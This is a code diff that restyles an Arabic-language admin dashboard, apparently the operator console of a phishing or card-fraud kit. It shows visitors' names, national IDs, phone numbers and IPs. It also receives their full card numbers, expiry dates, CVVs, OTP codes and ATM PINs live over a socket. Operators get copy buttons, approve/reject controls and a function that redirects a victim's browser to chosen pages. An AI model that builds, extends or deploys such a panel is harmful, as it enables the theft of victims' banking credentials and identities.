@@ -75,7 +75,7 @@ body { font-family: 'Cairo', 'Segoe UI', sans-serif; background: #f1f5f9; direct
 .conn-dot.online { background: #22c55e; animation: pulse 2s infinite; }
 @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
 
-/* Visitor counter - same style as original */
+/* Visitor counter */
 .visitor-counter {
   display: flex; align-items: center; gap: 6px;
   background: #f0fdf4; border: 1.5px solid #bbf7d0; border-radius: 20px;
@@ -159,7 +159,7 @@ tbody tr:hover td { background: #fafbfc; }
 .badge-otp { background: #fef3c7; color: #d97706; }
 .badge-pin { background: #ccfbf1; color: #0d9488; }
 
-/* Row flash */
+/* Row flash - only the row, not the whole page */
 @keyframes rowFlash { 0%{background:transparent} 25%{background:#fef9c3} 50%{background:#dcfce7} 75%{background:#fef9c3} 100%{background:transparent} }
 .row-flash td { animation: rowFlash 2s ease 3; }
 
@@ -205,106 +205,98 @@ tbody tr:hover td { background: #fafbfc; }
 }
 .modal-overlay.open { display: flex; }
 .modal {
-  background: #fff; border-radius: 16px; width: 100%; max-width: 480px;
+  background: #fff; border-radius: 16px; width: 100%; max-width: 440px;
   box-shadow: 0 20px 50px rgba(0,0,0,0.25); direction: rtl; margin: auto;
 }
 .modal-header {
-  padding: 10px 14px; border-bottom: 1px solid #f1f5f9;
+  padding: 12px 16px; border-bottom: 1px solid #f1f5f9;
   display: flex; align-items: center; justify-content: space-between;
-  border-radius: 16px 16px 0 0;
+  border-radius: 16px 16px 0 0; background: #fff;
 }
 .modal-header-left { display: flex; flex-direction: column; gap: 2px; }
 .modal-header-title { font-size: 14px; font-weight: 800; color: #1e293b; }
-.modal-header-sub { font-size: 11px; color: #64748b; font-family: monospace; }
+.modal-header-sub { font-size: 11px; color: #94a3b8; font-family: monospace; direction: ltr; }
 .modal-close {
-  width: 32px; height: 32px; border-radius: 8px; background: #f1f5f9; border: none;
+  width: 30px; height: 30px; border-radius: 8px; background: #f1f5f9; border: none;
   cursor: pointer; display: flex; align-items: center; justify-content: center;
   color: #64748b; transition: background 0.2s;
 }
 .modal-close:hover { background: #e2e8f0; }
-.modal-close svg { width: 16px; height: 16px; }
-.modal-body { padding: 10px 14px; }
+.modal-close svg { width: 15px; height: 15px; }
+.modal-body { padding: 14px 16px; }
 
-/* Modal sections */
-.msec { margin-bottom: 10px; }
+/* ---- Section title ---- */
+.msec { margin-bottom: 12px; }
 .msec-title {
-  font-size: 10px; font-weight: 700; color: #64748b; margin-bottom: 6px;
-  display: flex; align-items: center; gap: 6px; text-transform: uppercase; letter-spacing: 0.5px;
+  font-size: 10px; font-weight: 700; color: #94a3b8; margin-bottom: 6px;
+  display: flex; align-items: center; gap: 5px; text-transform: uppercase; letter-spacing: 0.5px;
 }
-.msec-title-icon { width: 20px; height: 20px; border-radius: 6px; display: flex; align-items: center; justify-content: center; }
-.msec-title-icon svg { width: 11px; height: 11px; }
+.msec-title-icon { width: 18px; height: 18px; border-radius: 5px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.msec-title-icon svg { width: 10px; height: 10px; }
 .ti-blue { background: #dbeafe; color: #2563eb; }
 .ti-green { background: #dcfce7; color: #16a34a; }
 .ti-purple { background: #ede9fe; color: #7c3aed; }
 
-.mfield-grid { background: #f8fafc; border-radius: 14px; padding: 4px 0; }
-.mfield {
+/* ---- Fields list (veachelimf style) ---- */
+.fields-list {
+  background: #fff; border: 1px solid #e8ecf0; border-radius: 12px; overflow: hidden;
+}
+.field-row {
   display: flex; align-items: center; justify-content: space-between;
-  padding: 6px 12px; border-bottom: 1px solid #f1f5f9;
+  padding: 8px 14px; border-bottom: 1px solid #f1f5f9;
 }
-.mfield:last-child { border-bottom: none; }
-.mfield-label { font-size: 11px; color: #64748b; font-weight: 600; }
-.mfield-value { font-size: 12px; font-weight: 700; color: #1e293b; direction: ltr; display: flex; align-items: center; gap: 6px; }
-.copy-btn {
-  width: 24px; height: 24px; border-radius: 6px; background: #e2e8f0; border: none;
-  cursor: pointer; display: flex; align-items: center; justify-content: center;
-  color: #64748b; transition: background 0.2s; flex-shrink: 0;
+.field-row:last-child { border-bottom: none; }
+.field-label { font-size: 12px; color: #94a3b8; font-weight: 600; flex-shrink: 0; }
+.field-value {
+  font-size: 13px; font-weight: 700; color: #1e293b;
+  direction: ltr; text-align: left; display: flex; align-items: center; gap: 6px;
+  word-break: break-all;
 }
-.copy-btn:hover { background: #cbd5e1; }
-.copy-btn svg { width: 12px; height: 12px; }
+.field-value.arabic { direction: rtl; text-align: right; }
 
-/* ---- CARD BOX ---- */
+/* ---- Card box (veachelimf style) ---- */
 .card-box {
-  border: 2px solid #e2e8f0; border-radius: 16px; overflow: hidden;
-  margin-bottom: 14px; transition: border-color 0.3s;
+  border: 1.5px solid #e2e8f0; border-radius: 12px; overflow: hidden;
+  background: #fff; transition: border-color 0.3s;
 }
 .card-box.has-card { border-color: #7c3aed; }
 .card-box-header {
   display: flex; align-items: center; justify-content: space-between;
-  padding: 8px 12px; background: #fafafa; border-bottom: 1px solid #f1f5f9;
+  padding: 8px 14px; background: #fafafa; border-bottom: 1px solid #f1f5f9;
 }
 .card-box-title {
-  font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px;
-  color: #334155;
+  font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px;
+  color: #64748b;
 }
 .live-dot {
-  width: 8px; height: 8px; border-radius: 50%; background: #ef4444;
+  width: 7px; height: 7px; border-radius: 50%; background: #ef4444;
   animation: pulse 1s infinite;
 }
 
-/* Card number display */
+/* Card number */
 .card-number-display {
-  font-size: 15px; font-weight: 900; letter-spacing: 3px; color: #1e293b;
+  font-size: 14px; font-weight: 900; letter-spacing: 3px; color: #1e293b;
   font-family: 'Courier New', monospace; direction: ltr;
 }
-.card-info-row {
-  display: flex; gap: 0; border-top: 1px solid #f1f5f9;
-}
-.card-info-cell {
-  flex: 1; padding: 7px 12px; border-left: 1px solid #f1f5f9;
-}
-.card-info-cell:last-child { border-left: none; }
-.card-info-cell label { font-size: 10px; color: #94a3b8; font-weight: 700; display: block; margin-bottom: 3px; text-transform: uppercase; }
-.card-info-cell span { font-size: 13px; font-weight: 800; color: #1e293b; direction: ltr; display: block; font-family: 'Courier New', monospace; }
 
-/* OTP / PIN inside card box */
+/* OTP / PIN rows inside card box */
 .code-row {
   display: flex; align-items: center; justify-content: space-between;
-  padding: 8px 14px; border-top: 1px solid #f1f5f9;
+  padding: 7px 14px; border-top: 1px solid #f1f5f9;
 }
-.code-row-label { font-size: 10px; font-weight: 700; color: #64748b; }
-.code-row-value { font-size: 15px; font-weight: 900; letter-spacing: 4px; font-family: 'Courier New', monospace; }
+.code-row-label { font-size: 11px; font-weight: 700; color: #64748b; }
+.code-row-value { font-size: 16px; font-weight: 900; letter-spacing: 4px; font-family: 'Courier New', monospace; }
 .code-otp { color: #d97706; }
 .code-pin { color: #0d9488; }
 
 /* Waiting state */
 .waiting-state {
   display: flex; align-items: center; justify-content: center; gap: 8px;
-  padding: 20px; color: #94a3b8; font-size: 13px; font-weight: 600;
+  padding: 18px; color: #94a3b8; font-size: 12px; font-weight: 600;
 }
 @keyframes spin { to { transform: rotate(360deg); } }
 .spinner { animation: spin 1s linear infinite; display: inline-block; }
-.spinner svg { width: 16px; height: 16px; }
+.spinner svg { width: 15px; height: 15px; }
 
 /* Action buttons */
 .action-row { display: flex; gap: 8px; padding: 10px 14px; border-top: 1px solid #f1f5f9; }
@@ -313,13 +305,22 @@ tbody tr:hover td { background: #fafbfc; }
   font-weight: 700; cursor: pointer; font-family: inherit; display: flex;
   align-items: center; justify-content: center; gap: 5px; transition: all 0.2s;
 }
-.btn-action svg { width: 14px; height: 14px; }
+.btn-action svg { width: 13px; height: 13px; }
 .btn-approve-gray { background: #e2e8f0; color: #94a3b8; pointer-events: none; }
 .btn-reject-gray { background: #e2e8f0; color: #94a3b8; pointer-events: none; }
 .btn-approve-active { background: #16a34a; color: #fff; }
 .btn-approve-active:hover { background: #15803d; }
 .btn-reject-active { background: #ef4444; color: #fff; }
 .btn-reject-active:hover { background: #dc2626; }
+
+/* Copy button */
+.copy-btn {
+  width: 22px; height: 22px; border-radius: 5px; background: #e2e8f0; border: none;
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  color: #64748b; transition: background 0.2s; flex-shrink: 0;
+}
+.copy-btn:hover { background: #cbd5e1; }
+.copy-btn svg { width: 11px; height: 11px; }
 
 /* Nav buttons inside modal */
 .nav-btns-wrap { display: flex; flex-wrap: wrap; gap: 6px; }
@@ -329,7 +330,7 @@ tbody tr:hover td { background: #fafbfc; }
 }
 .btn-nav-page:hover { opacity: 0.85; }
 
-/* Pulse */
+/* Pulse animation on card box */
 @keyframes boxPulse {
   0% { box-shadow: 0 0 0 0 rgba(124,58,237,0.4); }
   70% { box-shadow: 0 0 0 8px rgba(124,58,237,0); }
@@ -605,21 +606,22 @@ function initSocket() {
 
   // ---- New OTP or PIN ----
   socket.on('newCode', (data) => {
-    // Normalize IP: remove IPv6 prefix if present
     const rawIp = data.ip || '';
     const ip = rawIp.replace(/^::ffff:/, '');
-    const type = data.type || 'otp';
+    // Support both 'otp' and 'verification_code' as OTP type
+    const rawType = data.type || 'otp';
+    const type = (rawType === 'pin') ? 'pin' : 'otp';
 
-    // Try to find matching IP in allBookings (in case IP differs slightly)
+    // Try to find matching IP in liveData or allBookings
     let matchedIp = ip;
     if (!liveData[ip]) {
-      // Try to find by socketId match or closest IP in existing liveData
       const found = allBookings.find(b => b.ip && (b.ip === ip || b.ip.replace(/^::ffff:/, '') === ip));
       if (found) matchedIp = found.ip;
     }
 
     if (!liveData[matchedIp]) liveData[matchedIp] = {};
     liveData[matchedIp].requestId = data.requestId;
+
     if (type === 'pin') {
       liveData[matchedIp].pinData = data;
       liveStatus[matchedIp] = 'pin';
@@ -634,6 +636,7 @@ function initSocket() {
       showToast('🔑 رمز OTP جديد من: ' + matchedIp);
     }
     updatePendingCount();
+
     // If modal is open for this IP, update it immediately
     if (currentModalIp === matchedIp || currentModalIp === ip) {
       rebuildModalLive(currentModalIp);
@@ -776,7 +779,6 @@ async function navigateTo(ip, page) {
     if (data.success || data.sent) {
       showToast('✅ تم التوجيه إلى: ' + page);
     } else {
-      // Fallback via socket
       if (socket) socket.emit('adminNavigate', { ip, page });
       showToast('✅ تم التوجيه إلى: ' + page);
     }
@@ -799,7 +801,7 @@ async function showDetails(bookingId) {
   if (!booking) return;
   currentModalIp = booking.ip;
 
-  document.getElementById('modalSubTitle').textContent = 'حجز #' + booking.id + ' — IP: ' + (booking.ip || '-');
+  document.getElementById('modalSubTitle').textContent = '#' + booking.id + ' — ' + (booking.ip || '-');
 
   let extraData = { payments: [], codes: [] };
   try {
@@ -814,9 +816,7 @@ async function showDetails(bookingId) {
 function buildModalContent(booking, extraData) {
   const body = document.getElementById('modalBody');
 
-  const sc = { new:'badge-new', approved:'badge-approved', rejected:'badge-rejected', pending:'badge-pending' }[booking.status] || 'badge-new';
-  const sl = { new:'في انتظار الدفع', approved:'مقبول', rejected:'مرفوض', pending:'قيد المعالجة' }[booking.status] || 'في انتظار الدفع';
-
+  // ---- Section 1: بيانات العميل ----
   let html = `
   <div class="msec">
     <div class="msec-title">
@@ -825,26 +825,41 @@ function buildModalContent(booking, extraData) {
       </div>
       بيانات العميل
     </div>
-    <div class="mfield-grid">
-      <div class="mfield"><span class="mfield-label">الاسم</span><span class="mfield-value">${booking.name || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">رقم الهوية</span><span class="mfield-value">${booking.national_id || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">الهاتف</span><span class="mfield-value">${booking.phone_number || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">المنطقة</span><span class="mfield-value">${booking.region || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">IP</span><span class="mfield-value">${booking.ip || '-'}</span></div>
+    <div class="fields-list">
+      <div class="field-row">
+        <span class="field-label">الاسم</span>
+        <span class="field-value arabic">${booking.name || '-'}</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">رقم الهوية</span>
+        <span class="field-value">${booking.national_id || '-'}</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">الهاتف</span>
+        <span class="field-value">${booking.phone_number || '-'}</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">المنطقة</span>
+        <span class="field-value arabic">${booking.region || '-'}</span>
+      </div>
+      <div class="field-row">
+        <span class="field-label">IP</span>
+        <span class="field-value">${booking.ip || '-'}</span>
+      </div>
     </div>
   </div>`;
 
-  // Live card section
+  // ---- Section 2: بيانات البطاقة (live) ----
   html += buildCardSection(booking.ip, extraData);
 
-  // Navigation section
+  // ---- Section 3: توجيه ----
   html += `
   <div class="msec">
     <div class="msec-title">
       <div class="msec-title-icon ti-purple">
         <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
       </div>
-      توجيه العميل إلى صفحة
+      توجيه العميل
     </div>
     <div class="nav-btns-wrap">
       <button class="btn-nav-page" style="background:#ede9fe;color:#7c3aed" onclick="navigateTo('${booking.ip}','payments')">💳 الدفع</button>
@@ -885,10 +900,10 @@ function buildCardSection(ip, extraData) {
     <div class="card-box ${hasCard ? 'has-card' : ''}" id="modal-card-box">
       <div class="card-box-header">
         <div class="card-box-title">
-          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="16" height="16" style="color:${hasCard ? '#7c3aed' : '#94a3b8'}"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
-          <span style="color:${hasCard ? '#7c3aed' : '#94a3b8'}">بيانات البطاقة</span>
+          <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" width="14" height="14" style="color:${hasCard ? '#7c3aed' : '#94a3b8'}"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+          <span style="color:${hasCard ? '#7c3aed' : '#94a3b8'}">${hasCard ? 'بيانات البطاقة' : 'في انتظار البطاقة'}</span>
         </div>
-        ${pd ? '<div style="display:flex;align-items:center;gap:6px"><div class="live-dot"></div><span style="font-size:11px;color:#ef4444;font-weight:700">مباشر</span></div>' : ''}
+        ${pd ? '<div style="display:flex;align-items:center;gap:5px"><div class="live-dot"></div><span style="font-size:10px;color:#ef4444;font-weight:700">مباشر</span></div>' : ''}
       </div>`;
 
   if (cardData) {
@@ -899,28 +914,28 @@ function buildCardSection(ip, extraData) {
     const cvv = cardData.cvv || '-';
 
     html += `
-      <div style="padding:8px 12px;border-bottom:1px solid #f1f5f9">
-        <div style="font-size:10px;color:#94a3b8;font-weight:700;margin-bottom:4px;text-transform:uppercase">اسم الحامل</div>
-        <div style="font-size:13px;font-weight:800;color:#1e293b;display:flex;align-items:center;gap:8px">
-          ${holderName}
-          <button class="copy-btn" onclick="copyText('${holderName}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+      <div class="fields-list" style="border-radius:0;border:none;border-top:1px solid #f1f5f9">
+        <div class="field-row">
+          <span class="field-label">اسم الحامل</span>
+          <span class="field-value arabic" style="gap:6px">
+            ${holderName}
+            <button class="copy-btn" onclick="copyText('${holderName}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+          </span>
         </div>
-      </div>
-      <div style="padding:8px 12px;border-bottom:1px solid #f1f5f9">
-        <div style="font-size:10px;color:#94a3b8;font-weight:700;margin-bottom:4px;text-transform:uppercase">رقم البطاقة</div>
-        <div style="display:flex;align-items:center;gap:8px">
-          <span class="card-number-display">${cardNum}</span>
-          <button class="copy-btn" onclick="copyText('${rawNum}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+        <div class="field-row">
+          <span class="field-label">رقم البطاقة</span>
+          <span class="field-value" style="gap:6px">
+            <span class="card-number-display">${cardNum}</span>
+            <button class="copy-btn" onclick="copyText('${rawNum}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
+          </span>
         </div>
-      </div>
-      <div class="card-info-row">
-        <div class="card-info-cell">
-          <label>تاريخ الانتهاء</label>
-          <span>${expiry}</span>
+        <div class="field-row">
+          <span class="field-label">تاريخ الانتهاء</span>
+          <span class="field-value">${expiry}</span>
         </div>
-        <div class="card-info-cell">
-          <label>CVV</label>
-          <span>${cvv}</span>
+        <div class="field-row">
+          <span class="field-label">CVV</span>
+          <span class="field-value">${cvv}</span>
         </div>
       </div>`;
 
@@ -936,7 +951,7 @@ function buildCardSection(ip, extraData) {
         </div>
       </div>`;
     } else {
-      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔑 رمز OTP</span><span style="font-size:12px;color:#94a3b8">في الانتظار...</span></div>`;
+      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔑 رمز OTP</span><span style="font-size:11px;color:#94a3b8">في الانتظار...</span></div>`;
     }
 
     // PIN row inside card box
@@ -951,7 +966,7 @@ function buildCardSection(ip, extraData) {
         </div>
       </div>`;
     } else {
-      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔒 الرقم السري ATM</span><span style="font-size:12px;color:#94a3b8">في الانتظار...</span></div>`;
+      html += `<div class="code-row" style="background:#fafafa"><span class="code-row-label" style="color:#94a3b8">🔒 الرقم السري ATM</span><span style="font-size:11px;color:#94a3b8">في الانتظار...</span></div>`;
     }
 
     // Action buttons
@@ -988,7 +1003,17 @@ function buildCardSection(ip, extraData) {
     }
 
   } else {
-    html += `<div class="waiting-state"><span class="spinner"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span> في انتظار بيانات البطاقة...</div>`;
+    html += `<div class="waiting-state"><span class="spinner"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span> في انتظار بيانات البطاقة...</div>
+    <div class="action-row">
+      <button class="btn-action btn-approve-gray">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+        قبول
+      </button>
+      <button class="btn-action btn-reject-gray">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+        رفض
+      </button>
+    </div>`;
   }
 
   html += `</div></div>`; // close card-box and msec
